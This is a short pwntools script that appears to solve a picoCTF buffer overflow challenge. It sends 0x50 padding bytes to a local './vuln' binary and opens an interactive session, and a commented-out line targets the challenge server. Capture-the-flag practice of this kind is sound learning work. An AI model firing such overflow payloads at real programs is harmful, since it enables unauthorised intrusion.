from pwn import*

#p = remote('saturn.picoctf.net',53935)
p = process("./vuln")

payload = b"a"*0x50 

p.sendline(payload)
p.interactive()
